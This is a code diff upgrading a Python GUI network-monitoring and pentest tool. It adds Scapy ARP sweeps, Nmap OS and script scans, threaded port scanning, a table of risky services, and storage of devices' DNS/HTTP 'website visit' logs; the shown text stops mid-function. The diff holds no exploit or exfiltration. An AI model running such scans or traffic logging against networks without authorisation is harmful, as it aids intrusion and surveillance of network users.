@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-🛡️ NETMON PRO - Enterprise Network Security Suite v2.1
+🛡️ NETMON PRO - Enterprise Network Security Suite v2.2
 ✅ FULL DEVICE DETAILS | MAC | HOSTNAME | VENDOR LOOKUP | DETAILS PANEL
 ✅ SQLITE PERSISTENCE | OS FINGERPRINTING | VULN MAPPING
 ✅ Authorized Pentest Tool - All Features Unlocked
@@ -25,6 +25,7 @@ import platform
 import hashlib
 import uuid
 from collections import defaultdict
+from concurrent.futures import ThreadPoolExecutor
 
 # Optional dependencies
 SCAPY_AVAILABLE = False
@@ -35,6 +36,8 @@ nmap = None
 docx = None
 sniff = None
 ARP = None
+Ether = None
+srp = None
 IP = None
 DNSQR = None
 TCP = None
@@ -49,7 +52,7 @@ def _resolve_fpdf_class():
 
 def check_dependencies():
     global SCAPY_AVAILABLE, NMAP_AVAILABLE, FPDF_AVAILABLE, DOCX_AVAILABLE
-    global nmap, docx, sniff, ARP, IP, DNSQR, TCP, Raw
+    global nmap, docx, sniff, ARP, Ether, srp, IP, DNSQR, TCP, Raw, TLS
     SCAPY_AVAILABLE = False
     NMAP_AVAILABLE = False
     DOCX_AVAILABLE = False
@@ -57,15 +60,27 @@ def check_dependencies():
     docx = None
     sniff = None
     ARP = None
+    Ether = None
+    srp = None
     IP = None
     DNSQR = None
     TCP = None
     Raw = None
+    TLS = None
     try:
         from scapy.all import sniff as scapy_sniff, ARP as scapy_ARP, IP as scapy_IP
         from scapy.all import DNSQR as scapy_DNSQR, TCP as scapy_TCP, Raw as scapy_Raw
+        from scapy.all import Ether as scapy_Ether, srp as scapy_srp
+        try:
+            from scapy.layers.tls.all import TLS as scapy_TLS
+            TLS = scapy_TLS
+        except ImportError:
+            TLS = None
+        
         sniff = scapy_sniff
         ARP = scapy_ARP
+        Ether = scapy_Ether
+        srp = scapy_srp
         IP = scapy_IP
         DNSQR = scapy_DNSQR
         TCP = scapy_TCP
@@ -340,7 +355,7 @@ class ComplianceReporter:
 class NetMonPro:
     def __init__(self, root):
         self.root = root
-        self.root.title("🛡️ NetMon PRO v2.1 - Enterprise Pentest Suite")
+        self.root.title("🛡️ NetMon PRO v2.2 - Enterprise Pentest Suite")
         self.root.geometry("1800x1100")
         self.root.minsize(1400, 900)
         self.root.configure(bg='#1e1e1e')
@@ -369,6 +384,8 @@ class NetMonPro:
         self.last_audit_summary = {}
         self.config_assessment_results = {}
         self.hygiene_results = {}
+        self.last_activity_log = {}
+        self.inventory_monitor_running = True
         self.fim_running = False
         self.monitoring_paused = False
         self.log_queue = queue.Queue()
@@ -416,72 +433,139 @@ class NetMonPro:
         self._auto_discover_network()
         self._load_history()
         
-        self.log("🚀 NetMon PRO v2.1 - Enterprise Pentest Ready!")
+        self.log("🚀 NetMon PRO v2.2 - Enterprise Pentest Ready!")
         self.log("📦 SQLite Persistence: Enabled")
     
     def _init_db(self):
-        """Initialize SQLite database for device history"""
+        """Initialize SQLite database for device history and traffic logs"""
         try:
             with sqlite3.connect(DB_FILE) as conn:
                 c = conn.cursor()
+                # Table for device inventory
                 c.execute('''CREATE TABLE IF NOT EXISTS devices
                              (ip TEXT PRIMARY KEY, mac TEXT, hostname TEXT, 
                               vendor TEXT, status TEXT, last_seen TEXT,
-                              custom_name TEXT, connection_time TEXT, is_critical INTEGER DEFAULT 0)''')
+                              custom_name TEXT, connection_time TEXT, is_critical INTEGER DEFAULT 0,
+                              os_type TEXT DEFAULT 'Unknown')''')
+
+                # Table for historical traffic/activity (Website visits)
+                c.execute('''CREATE TABLE IF NOT EXISTS traffic
+                             (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                              timestamp TEXT,
+                              ip TEXT,
+                              type TEXT,
+                              detail TEXT)''')
 
                 # Migration: Add columns if they don't exist
                 try:
                     c.execute("ALTER TABLE devices ADD COLUMN custom_name TEXT")
-                except sqlite3.OperationalError:
-                    pass
+                except sqlite3.OperationalError: pass
                 try:
                     c.execute("ALTER TABLE devices ADD COLUMN connection_time TEXT")
-                except sqlite3.OperationalError:
-                    pass
+                except sqlite3.OperationalError: pass
                 try:
                     c.execute("ALTER TABLE devices ADD COLUMN is_critical INTEGER DEFAULT 0")
-                except sqlite3.OperationalError:
-                    pass
+                except sqlite3.OperationalError: pass
+                try:
+                    c.execute("ALTER TABLE devices ADD COLUMN os_type TEXT DEFAULT 'Unknown'")
+                except sqlite3.OperationalError: pass
+                
+                conn.commit()
         except Exception as e:
             self.log(f"❌ DB Init Error: {e}", "ERROR")
 
-    def _save_to_db(self, ip, info):
-        """Save device data to history"""
+    def _fingerprint_os(self, ip):
+        """Perform deep OS detection using Nmap"""
+        if not NMAP_AVAILABLE or nmap is None:
+            self.log("⚠️ Nmap not available for OS Fingerprinting", "WARN")
+            return "Nmap Missing"
+        
+        self.log(f"🔍 Deep Scan: Fingerprinting OS for {ip}...", "INFO")
+        try:
+            nm = nmap.PortScanner()
+            # -O is for OS detection, -T4 for speed
+            # Note: Requires sudo/root
+            nm.scan(ip, arguments="-O -T4")
+            
+            os_match = "Unknown"
+            if ip in nm.all_hosts():
+                if "osmatch" in nm[ip] and len(nm[ip]["osmatch"]) > 0:
+                    os_match = nm[ip]["osmatch"][0]["name"]
+                    accuracy = nm[ip]["osmatch"][0]["accuracy"]
+                    self.log(f"✅ OS Detected for {ip}: {os_match} ({accuracy}%)", "SUCCESS")
+                else:
+                    self.log(f"⚠️ OS detection inconclusive for {ip}", "WARN")
+            
+            # Update local state and DB
+            with self.state_lock:
+                if ip in self.devices:
+                    self.devices[ip]["os_type"] = os_match
+                    self._save_to_db(ip, self.devices[ip])
+                    self._queue_ui(self._update_devices_tree)
+            
+            return os_match
+        except Exception as e:
+            self.log(f"❌ Fingerprinting Error ({ip}): {e}", "ERROR")
+            return "Error"
+
+    def _save_traffic_to_db(self, ip, activity_type, detail):
+        """Persist a traffic event to the database"""
         try:
             with sqlite3.connect(DB_FILE) as conn:
                 c = conn.cursor()
-                c.execute('''INSERT OR REPLACE INTO devices VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                c.execute("INSERT INTO traffic (timestamp, ip, type, detail) VALUES (?, ?, ?, ?)",
+                          (timestamp, ip, activity_type, detail))
+                conn.commit()
+        except Exception as e:
+            # Silent fail to avoid flooding logs during high traffic
+            pass
+
+    def _save_to_db(self, ip, info):
+        """Save device data to history including OS type"""
+        try:
+            with sqlite3.connect(DB_FILE) as conn:
+                c = conn.cursor()
+                # 10 columns now: ip, mac, hostname, vendor, status, last_seen, custom_name, connection_time, is_critical, os_type
+                c.execute('''INSERT OR REPLACE INTO devices VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                           (ip, info.get('mac'), info.get('hostname'), 
                            info.get('vendor'), info.get('status'), 
                            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            info.get('custom_name', ''), info.get('connection_time', ''),
-                           1 if info.get('is_critical', False) else 0))
+                           1 if info.get('is_critical', False) else 0,
+                           info.get('os_type', 'Unknown')))
+                conn.commit()
         except Exception as exc:
             self.log(f"⚠️ DB Save Error ({ip}): {exc}", "WARN")
 
     def _load_history(self):
-        """Load previously discovered devices"""
+        """Load previously discovered devices including OS history"""
         try:
             with sqlite3.connect(DB_FILE) as conn:
                 c = conn.cursor()
                 c.execute("SELECT * FROM devices")
                 for row in c.fetchall():
-                    ip, mac, host, vendor, status, last, custom, conn_time, critical = row
-                    mac_value = self._normalize_mac(mac) or ('??:??:??:??:??:??' if self._is_unknown_identity(mac) else str(mac or '??:??:??:??:??:??'))
-                    host_value = host if not self._is_unknown_identity(host) else 'Unknown'
-                    vendor_value = vendor if not self._is_unknown_identity(vendor) else 'Unknown'
-                    self.devices[ip] = {
-                        'mac': mac_value, 'hostname': host_value,
-                        'vendor': vendor_value, 'status': f'OFFLINE (Last: {last})',
-                        'custom_name': custom or '',
-                        'connection_time': conn_time or '',
-                        'is_critical': bool(critical)
-                    }
+                    # Handle rows with different lengths if migration wasn't perfect
+                    if len(row) >= 9:
+                        ip, mac, host, vendor, status, last, custom, conn_time, critical = row[:9]
+                        os_val = row[9] if len(row) > 9 else 'Unknown'
+
+                        mac_value = self._normalize_mac(mac) or ('??:??:??:??:??:??' if self._is_unknown_identity(mac) else str(mac or '??:??:??:??:??:??'))
+                        host_value = host if not self._is_unknown_identity(host) else 'Unknown'
+                        vendor_value = vendor if not self._is_unknown_identity(vendor) else 'Unknown'
+
+                        self.devices[ip] = {
+                            'mac': mac_value, 'hostname': host_value,
+                            'vendor': vendor_value, 'status': f'OFFLINE (Last: {last})',
+                            'custom_name': custom or '',
+                            'connection_time': conn_time or '',
+                            'is_critical': bool(critical),
+                            'os_type': os_val
+                        }
             self._update_devices_tree()
             self.log(f"📚 Loaded {len(self.devices)} devices from history")
         except Exception as exc:
             self.log(f"⚠️ History Load Error: {exc}", "WARN")
-
     def log(self, message, level="INFO"):
         timestamp = datetime.now().strftime("[%H:%M:%S]")
         icon = ""
@@ -906,7 +990,7 @@ class NetMonPro:
 
         tk.Label(
             header_frame,
-            text="🛡️ NETMON PRO v2.1 - Enterprise Security Operations",
+            text="🛡️ NETMON PRO v2.2 - Enterprise Security Operations",
             bg="#0d1117",
             fg="#58a6ff",
             font=("Segoe UI", 16, "bold"),
@@ -1256,6 +1340,7 @@ class NetMonPro:
             ("🔍 Deep Scan", self.deep_device_scan_gui),
             ("🌐 Nmap", self.nmap_scan_selected_gui),
             ("📡 Route", self.traceroute_selected),
+            ("🖥️ Fingerprint OS", self.fingerprint_os_gui),
             ("🛡️ Critical", self.toggle_critical_asset),
             ("💾 Save", self.save_device_details),
             ("🗑️ Clear", self.clear_saved_device_gui)
@@ -1415,6 +1500,39 @@ class NetMonPro:
             style.configure("Treeview", rowheight=26)
             self._setup_devices_tree()
 
+    def fingerprint_os_gui(self):
+        if not self.selected_device:
+            messagebox.showwarning("No Selection", "Select an IP/device from inventory first.")
+            return
+        ip = self.selected_device
+        threading.Thread(target=self._fingerprint_os, args=(ip,), daemon=True).start()
+
+    def _map_vulnerabilities(self, ip, ports_dict):
+        """Cross-reference open ports with known vulnerabilities for corporate monitoring"""
+        # Corporate Vulnerability Database (Common Risks)
+        VULN_DB = {
+            21: {"service": "FTP", "risk": "High", "desc": "Unencrypted File Transfer. Credentials can be sniffed. Use SFTP instead."},
+            23: {"service": "Telnet", "risk": "Critical", "desc": "Plaintext remote access. Obsolete and highly insecure. Use SSH."},
+            25: {"service": "SMTP", "risk": "Medium", "desc": "Unencrypted Email. Vulnerable to interception and relaying attacks."},
+            80: {"service": "HTTP", "risk": "Medium", "desc": "Unencrypted Web Traffic. Sensitive data is exposed. Enforce HTTPS."},
+            135: {"service": "RPC", "risk": "Low", "desc": "Microsoft RPC. Often targeted for enumeration and lateral movement."},
+            139: {"service": "NetBIOS", "risk": "Medium", "desc": "NetBIOS-SSN. Vulnerable to spoofing and information disclosure."},
+            445: {"service": "SMB", "risk": "High", "desc": "Microsoft SMB. High risk of EternalBlue/WannaCry-style exploits. Ensure patched."},
+            3306: {"service": "MySQL", "risk": "Medium", "desc": "Direct Database Access. Vulnerable to brute force if exposed to network."},
+            3389: {"service": "RDP", "risk": "High", "desc": "Remote Desktop. Frequent target for brute force and BlueKeep exploits."},
+            5900: {"service": "VNC", "risk": "High", "desc": "VNC Remote Access. Often used with weak passwords; poorly encrypted."},
+            8080: {"service": "HTTP-Proxy", "risk": "Medium", "desc": "Alternative HTTP. Often used for shadow IT or unmonitored services."}
+        }
+        
+        findings = []
+        for port, service_name in ports_dict.items():
+            port_num = int(port)
+            if port_num in VULN_DB:
+                vuln = VULN_DB[port_num]
+                findings.append(f"⚠️ [{vuln['risk']}] {vuln['service']} (Port {port_num}): {vuln['desc']}")
+        
+        return findings
+
     def _show_device_details(self, ip):
         with self.state_lock:
             if ip not in self.devices:
@@ -1435,6 +1553,10 @@ class NetMonPro:
         self.summary_text.insert(tk.END, summary)
         self.summary_text.config(state='disabled')
         
+        # Calculate Vulnerability Findings
+        ports = details.get('ports', {})
+        vuln_findings = self._map_vulnerabilities(ip, ports)
+        
         full_details = f"""🎯 DEVICE INTEL: {ip} ({custom or 'No Name'})
 ═══════════════════════════════════════
 🔗 BASIC INFO
@@ -1442,19 +1564,22 @@ IP:           {ip}
 MAC:          {device.get('mac', 'N/A')}
 Hostname:     {device.get('hostname', 'N/A')}
 Vendor:       {device.get('vendor', 'N/A')}
-OS Detected:  {details.get('os', 'Unknown')}
+OS Detected:  {device.get('os_type', 'Unknown')}
 Connected:    {device.get('connection_time', 'N/A')}
 
 📊 DISCOVERY DATA
 First Seen:   {details.get('first_seen', 'N/A')}
 Last Seen:    {details.get('last_seen', 'N/A')}
-Open Ports:   {len(details.get('ports', {}))}
+Open Ports:   {len(ports)}
+
+🚨 SECURITY FINDINGS
+{chr(10).join(vuln_findings) or '✅ No high-risk services detected.'}
 
 🔍 SERVICES
-{chr(10).join([f"  • {p} ({s})" for p, s in details.get('ports', {}).items()]) or 'None'}
+{chr(10).join([f"  • {p} ({s})" for p, s in ports.items()]) or 'None'}
 
-🌐 TRAFFIC LOGS (DNS)
-{chr(10).join(traffic[-10:]) or 'No traffic recorded'}
+🌐 TRAFFIC LOGS (DNS/HTTP)
+{chr(10).join(traffic[-15:]) or 'No traffic recorded'}
 
 🌐 NETWORK PATH
 {details.get('traceroute', 'Not scanned')}
@@ -1527,7 +1652,7 @@ Open Ports:   {len(details.get('ports', {}))}
         self.log("🔍 Router discovery...")
         self._queue_ui(self._start_task_ui, "Discovering router...")
         
-        # Try to get from system route first
+        # 1. Try to get from system route first (most accurate and fastest)
         try:
             if platform.system() == 'Windows':
                 res = self._run_command(['route', 'print', '0.0.0.0'], capture_output=True, timeout=5, silent=True)
@@ -1551,22 +1676,32 @@ Open Ports:   {len(details.get('ports', {}))}
                         self.log(f"✅ Router discovered via ip route: {gw}")
                         self._queue_ui(self._end_task_ui)
                         return
-        except: pass
+        except Exception: pass
 
-        gateways = ['192.168.1.1', '192.168.0.1', '10.0.0.1', '172.16.0.1', '172.16.1.1']
-        ping_cmd = ['ping', '-n', '1', '-w', '2000'] if platform.system() == 'Windows' else ['ping', '-c', '1', '-W', '2']
-        for gw in gateways:
+        # 2. Parallel Ping Fallback
+        gateways = ['192.168.1.1', '192.168.0.1', '192.168.1.254', '10.0.0.1', '10.0.0.254', '172.16.0.1', '172.16.1.1']
+        ping_cmd = ['ping', '-n', '1', '-w', '1000'] if platform.system() == 'Windows' else ['ping', '-c', '1', '-W', '1']
+        
+        def check_gw(gw):
             try:
-                result = self._run_command([*ping_cmd, gw], timeout=4, silent=True)
+                result = self._run_command([*ping_cmd, gw], timeout=2, silent=True)
                 if result and result.returncode == 0:
-                    self.router_ip = gw
-                    self._queue_ui(self.router_label.config, text=f"Router: {gw} ✅")
+                    return gw
+            except Exception: pass
+            return None
+
+        with ThreadPoolExecutor(max_workers=len(gateways)) as executor:
+            results = list(executor.map(check_gw, gateways))
+            for res in results:
+                if res:
+                    self.router_ip = res
+                    self._queue_ui(self.router_label.config, text=f"Router: {res} ✅")
                     self._queue_ui(self._end_task_ui)
-                    self.log(f"✅ Router LIVE (fallback scan): {gw}")
+                    self.log(f"✅ Router LIVE (fallback parallel scan): {res}")
                     return
-            except: continue
+
         self._queue_ui(self._end_task_ui)
-        self.log("⚠️ No router ping response", "WARN")
+        self.log("⚠️ No router response detected", "WARN")
 
     def scan_local_gui(self):
         if not self.isp_range:
@@ -1575,54 +1710,116 @@ Open Ports:   {len(details.get('ports', {}))}
             return
         threading.Thread(target=self._scan_local, daemon=True).start()
     
+    def _scan_ip(self, ip, ping_cmd):
+        try:
+            result = self._run_command([*ping_cmd, ip], timeout=2, silent=True)
+            if result and result.returncode == 0:
+                resolved_host = self._resolve_hostname(ip)
+                discovered_mac = self._get_mac_for_ip(ip)
+                with self.state_lock:
+                    info = self.devices.get(ip, {
+                        'mac': '??:??:??:??:??:??', 
+                        'hostname': 'Unknown',
+                        'vendor': 'Unknown', 
+                        'status': 'LIVE',
+                        'connection_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    })
+                    current_mac = self._normalize_mac(info.get('mac', ''))
+                    if self._is_unknown_identity(current_mac) and discovered_mac:
+                        current_mac = discovered_mac
+
+                    current_host = info.get('hostname', 'Unknown')
+                    if self._is_unknown_identity(current_host) and not self._is_unknown_identity(resolved_host):
+                        current_host = resolved_host
+
+                    current_vendor = info.get('vendor', 'Unknown')
+                    if not self._is_unknown_identity(current_mac):
+                        looked_up_vendor = self._get_vendor(current_mac)
+                        if not self._is_unknown_identity(looked_up_vendor):
+                            current_vendor = looked_up_vendor
+
+                    info['mac'] = current_mac or '??:??:??:??:??:??'
+                    info['hostname'] = current_host if current_host else 'Unknown'
+                    info['vendor'] = current_vendor if current_vendor else 'Unknown'
+                    info['status'] = 'LIVE'
+                    if 'connection_time' not in info or not info['connection_time']:
+                        info['connection_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    self.devices[ip] = info
+                if ip not in self.device_details:
+                    self.device_details[ip] = {'first_seen': datetime.now().strftime("%H:%M:%S")}
+                self._save_to_db(ip, info)
+                self._queue_ui(self._update_devices_tree)
+                return True
+        except: pass
+        return False
+
     def _scan_local(self):
         self.log("🏠 Scanning local /24 network...")
         self._queue_ui(self._start_task_ui, "Scanning local /24...")
+        
         live_count = 0
-        ping_cmd = ['ping', '-n', '1', '-w', '1000'] if platform.system() == 'Windows' else ['ping', '-c', '1', '-W', '1']
-        for i in range(min(254, len(self.isp_range))):
-            ip = str(self.isp_range[i])
+        
+        # 1. Try high-speed Scapy ARP scan first (most accurate for local network)
+        if SCAPY_AVAILABLE and self._is_root_user() and self.router_ip:
             try:
-                result = self._run_command([*ping_cmd, ip], timeout=2, silent=True)
-                if result and result.returncode == 0:
+                self.log("📡 Using Scapy ARP scan for high accuracy...")
+                network_prefix = ".".join(self.router_ip.split(".")[:-1]) + ".0/24"
+                ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_prefix), timeout=3, verbose=False)
+                
+                for snd, rcv in ans:
+                    ip = rcv.psrc
+                    mac = rcv.hwsrc
                     live_count += 1
                     resolved_host = self._resolve_hostname(ip)
-                    discovered_mac = self._get_mac_for_ip(ip)
                     with self.state_lock:
                         info = self.devices.get(ip, {
-                            'mac': '??:??:??:??:??:??', 
-                            'hostname': 'Unknown',
-                            'vendor': 'Unknown', 
+                            'mac': mac, 
+                            'hostname': resolved_host,
+                            'vendor': self._get_vendor(mac), 
                             'status': 'LIVE',
                             'connection_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                         })
-                        current_mac = self._normalize_mac(info.get('mac', ''))
-                        if self._is_unknown_identity(current_mac) and discovered_mac:
-                            current_mac = discovered_mac
-
-                        current_host = info.get('hostname', 'Unknown')
-                        if self._is_unknown_identity(current_host) and not self._is_unknown_identity(resolved_host):
-                            current_host = resolved_host
-
-                        current_vendor = info.get('vendor', 'Unknown')
-                        if not self._is_unknown_identity(current_mac):
-                            looked_up_vendor = self._get_vendor(current_mac)
-                            if not self._is_unknown_identity(looked_up_vendor):
-                                current_vendor = looked_up_vendor
-
-                        info['mac'] = current_mac or '??:??:??:??:??:??'
-                        info['hostname'] = current_host if current_host else 'Unknown'
-                        info['vendor'] = current_vendor if current_vendor else 'Unknown'
                         info['status'] = 'LIVE'
-                        if 'connection_time' not in info or not info['connection_time']:
-                            info['connection_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        info['mac'] = mac
+                        if self._is_unknown_identity(info['hostname']):
+                             info['hostname'] = resolved_host
                         self.devices[ip] = info
-                    self.device_details[ip] = {'first_seen': datetime.now().strftime("%H:%M:%S")}
+                    if ip not in self.device_details:
+                        self.device_details[ip] = {'first_seen': datetime.now().strftime("%H:%M:%S")}
                     self._save_to_db(ip, info)
-                    self._queue_ui(self._update_devices_tree)
-            except: continue
+                
+                self._queue_ui(self._update_devices_tree)
+                if live_count > 0:
+                    self.log(f"✅ Scapy ARP scan: {live_count} LIVE hosts", "SUCCESS")
+                    self._queue_ui(self._end_task_ui)
+                    return
+            except Exception as e:
+                self.log(f"⚠️ Scapy ARP scan failed: {e}. Falling back to ping...", "WARN")
+
+        # 2. Parallel Ping Sweep (Fallback or if not root)
+        if not self.isp_range:
+             self._discover_network_info()
+             if not self.isp_range:
+                 self.log("❌ Cannot scan: Network range unknown", "ERROR")
+                 self._queue_ui(self._end_task_ui)
+                 return
+
+        self.log("🚀 Running parallel ping sweep...")
+        ping_cmd = ['ping', '-n', '1', '-w', '1000'] if platform.system() == 'Windows' else ['ping', '-c', '1', '-W', '1']
+        
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = []
+            for i in range(min(254, len(self.isp_range))):
+                ip = str(self.isp_range[i])
+                futures.append(executor.submit(self._scan_ip, ip, ping_cmd))
+            
+            for f in futures:
+                if f.result():
+                    live_count += 1
+        
         self._queue_ui(self._end_task_ui)
-        self.log(f"✅ Local scan: {live_count} LIVE hosts")
+        self.log(f"✅ Local scan: {live_count} LIVE hosts", "SUCCESS")
+
 
     def _resolve_hostname(self, ip):
         try: return socket.gethostbyaddr(ip)[0]
@@ -1649,6 +1846,7 @@ Open Ports:   {len(details.get('ports', {}))}
         return self._normalize_mac(match.group(1)) if match else ""
 
     def _get_mac_for_ip(self, ip):
+        # 1. Try system neighbor table first (fastest)
         commands = []
         if platform.system() == "Windows":
             commands = [['arp', '-a', ip]]
@@ -1657,14 +1855,22 @@ Open Ports:   {len(details.get('ports', {}))}
 
         for cmd in commands:
             try:
-                res = self._run_command(cmd, capture_output=True, timeout=3, silent=True)
-                if not res or not res.stdout:
-                    continue
-                mac = self._extract_mac(res.stdout)
-                if mac:
-                    return mac
+                res = self._run_command(cmd, capture_output=True, timeout=2, silent=True)
+                if res and res.stdout:
+                    mac = self._extract_mac(res.stdout)
+                    if mac: return mac
             except Exception:
                 continue
+
+        # 2. If Scapy and root, use a direct ARP request (most accurate)
+        if SCAPY_AVAILABLE and self._is_root_user():
+            try:
+                # Targeted ARP request
+                ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=1, verbose=False)
+                if ans:
+                    return self._normalize_mac(ans[0][1].hwsrc)
+            except Exception:
+                pass
         return ""
 
     def arp_monitor_gui(self):
@@ -2124,12 +2330,14 @@ Open Ports:   {len(details.get('ports', {}))}
         
         self._set_text_widget(self.services_text, "\n".join(services_summary))
 
-    def _deep_scan_device(self, ip):
+    def _deep_scan_device(self, ip, silent=False):
         if not self._is_valid_ipv4(ip):
-            self.log(f"⚠️ Invalid target IP skipped: {ip}", "WARN")
+            if not silent: self.log(f"⚠️ Invalid target IP skipped: {ip}", "WARN")
             return
-        self.log(f"🔍 Deep scanning {ip}...")
-        self._queue_ui(self._start_task_ui, f"Deep scanning {ip}...")
+        if not silent:
+            self.log(f"🔍 Deep scanning {ip}...")
+            self._queue_ui(self._start_task_ui, f"Deep scanning {ip}...")
+        
         details = self.device_details.get(ip, {})
         details['os'] = self._detect_os(ip)
         details['ports'] = self._quick_port_scan(ip)
@@ -2142,33 +2350,65 @@ Open Ports:   {len(details.get('ports', {}))}
             details['traceroute'] = res.stdout if res else "Traceroute unavailable"
         except: details['traceroute'] = "Failed"
         self.device_details[ip] = details
+        
         self._queue_ui(self._show_device_details, ip)
         self._queue_ui(self._update_services_tab)
-        self._queue_ui(self._end_task_ui)
-        self.log(f"✅ Deep scan complete: {ip}")
+        
+        if not silent:
+            self._queue_ui(self._end_task_ui)
+            self.log(f"✅ Deep scan complete: {ip}")
 
     def _detect_os(self, ip):
+        # 1. Nmap is most accurate
         if NMAP_AVAILABLE:
             try:
                 nm = nmap.PortScanner()
-                nm.scan(ip, arguments='-O --osscan-limit')
-                if 'osmatch' in nm[ip] and nm[ip]['osmatch']:
-                    return nm[ip]['osmatch'][0]['name']
-            except: pass
+                # Enhanced OS detection with aggressive timing and guessing
+                nm.scan(ip, arguments='-O --osscan-guess --max-os-tries 1 -T4')
+                if ip in nm.all_hosts() and 'osmatch' in nm[ip] and nm[ip]['osmatch']:
+                    os_match = nm[ip]['osmatch'][0]
+                    return f"{os_match['name']} ({os_match['accuracy']}% accuracy)"
+            except Exception: pass
+
+        # 2. TTL-based fingerprinting (Fast fallback)
+        try:
+            ping_res = self._run_command(['ping', '-c', '1', '-W', '1', ip], capture_output=True, timeout=2, silent=True)
+            if ping_res and ping_res.stdout:
+                ttl_match = re.search(r'ttl=(\d+)', ping_res.stdout.lower())
+                if ttl_match:
+                    ttl = int(ttl_match.group(1))
+                    if ttl <= 64: return "Linux/Unix/macOS (TTL-based)"
+                    if ttl <= 128: return "Windows (TTL-based)"
+                    if ttl <= 255: return "Cisco/Network Device (TTL-based)"
+        except Exception: pass
+
         return "Unknown (Requires sudo/Nmap)"
 
     def _quick_port_scan(self, ip):
-        common = [21,22,23,80,443,3389,8080]
+        common = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443]
         open_p = {}
-        for port in common:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-                sock.settimeout(0.3)
-                if sock.connect_ex((ip, port)) == 0:
-                    open_p[port] = self._get_service_name(port)
+        
+        def check_port(p):
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                    sock.settimeout(0.5)
+                    if sock.connect_ex((ip, p)) == 0:
+                        return p, self._get_service_name(p)
+            except: pass
+            return None
+
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            results = list(executor.map(check_port, common))
+            for r in results:
+                if r:
+                    p, name = r
+                    open_p[p] = name
         return open_p
 
     def _get_service_name(self, port):
-        services = {21:'FTP', 22:'SSH', 23:'Telnet', 80:'HTTP', 443:'HTTPS', 3389:'RDP'}
+        services = {21:'FTP', 22:'SSH', 23:'Telnet', 25:'SMTP', 53:'DNS', 80:'HTTP', 110:'POP3', 
+                    135:'RPC', 139:'NetBIOS', 143:'IMAP', 443:'HTTPS', 445:'SMB', 993:'IMAPS', 
+                    995:'POP3S', 1723:'PPTP', 3306:'MySQL', 3389:'RDP', 5900:'VNC', 8080:'HTTP-Proxy', 8443:'HTTPS-Alt'}
         return services.get(port, f'TCP/{port}')
 
     def nmap_scan_selected_gui(self):
@@ -2192,24 +2432,45 @@ Open Ports:   {len(details.get('ports', {}))}
         if not self._is_valid_ipv4(ip):
             self.log(f"⚠️ Invalid target IP skipped: {ip}", "WARN")
             return
-        self.log(f"🌐 Nmap scanning {ip}...")
-        self._queue_ui(self._start_task_ui, f"Nmap scan in progress ({ip})...")
-        nm = nmap.PortScanner()
-        nm.scan(ip, arguments='-sV -T4')
-        res = [f"🌐 NMAP RESULTS: {ip}"]
-        if ip in nm.all_hosts():
-            details = self.device_details.get(ip, {})
-            details['ports'] = details.get('ports', {})
-            for proto in nm[ip].all_protocols():
-                for port in nm[ip][proto]:
-                    svc = f"{nm[ip][proto][port]['name']} ({nm[ip][proto][port]['version']})"
-                    res.append(f"Port {port}: {svc}")
-                    details['ports'][port] = svc
-            self.device_details[ip] = details
-        self._queue_ui(self._set_text_widget, self.results_text, "\n".join(res))
-        self._queue_ui(self._show_device_details, ip)
-        self._queue_ui(self._update_services_tab)
-        self._queue_ui(self._end_task_ui)
+        self.log(f"🌐 Nmap deep scanning {ip}...")
+        self._queue_ui(self._start_task_ui, f"Nmap deep scan in progress ({ip})...")
+        try:
+            nm = nmap.PortScanner()
+            # sV = version detection, sC = default scripts, O = OS detection, T4 = aggressive timing
+            nm.scan(ip, arguments='-sV -sC -O -T4')
+            res = [f"🌐 NMAP RESULTS: {ip}"]
+            if ip in nm.all_hosts():
+                details = self.device_details.get(ip, {})
+                details['ports'] = details.get('ports', {})
+                
+                # Update OS if detected during this scan
+                if 'osmatch' in nm[ip] and nm[ip]['osmatch']:
+                    details['os'] = f"{nm[ip]['osmatch'][0]['name']} ({nm[ip]['osmatch'][0]['accuracy']}% accuracy)"
+
+                for proto in nm[ip].all_protocols():
+                    for port in nm[ip][proto]:
+                        port_info = nm[ip][proto][port]
+                        svc_name = port_info['name']
+                        svc_ver = port_info['version']
+                        svc_ext = port_info.get('extrainfo', '')
+                        
+                        full_svc = f"{svc_name} {svc_ver} {svc_ext}".strip()
+                        res.append(f"Port {port}: {full_svc}")
+                        details['ports'][port] = full_svc
+                        
+                        # Add script output to details if available
+                        if 'script' in port_info:
+                            for script_id, output in port_info['script'].items():
+                                res.append(f"  └─ {script_id}: {output.strip()}")
+
+                self.device_details[ip] = details
+            self._queue_ui(self._set_text_widget, self.results_text, "\n".join(res))
+        except Exception as e:
+            self.log(f"❌ Nmap deep scan failed for {ip}: {e}", "ERROR")
+        finally:
+            self._queue_ui(self._show_device_details, ip)
+            self._queue_ui(self._update_services_tab)
+            self._queue_ui(self._end_task_ui)
 
     def traceroute_selected(self):
         if not self.selected_device: return
@@ -2280,12 +2541,25 @@ Open Ports:   {len(details.get('ports', {}))}
         threading.Thread(target=self._service_discovery_all, daemon=True).start()
 
     def _service_discovery_all(self):
-        self.log("🛠️ Starting Global Service Discovery...")
+        self.log("🛠️ Starting Parallel Global Service Discovery...")
+        self._queue_ui(self._start_task_ui, "Running global service discovery...")
+        
         with self.state_lock:
             targets = [ip for ip, info in self.devices.items() if "LIVE" in info.get('status', '')]
-        for ip in targets:
-            self._deep_scan_device(ip)
-        self.log("✅ Global Service Discovery complete")
+        
+        if not targets:
+            self.log("⚠️ No live hosts found for discovery. Try a local scan first.")
+            self._queue_ui(self._end_task_ui)
+            return
+
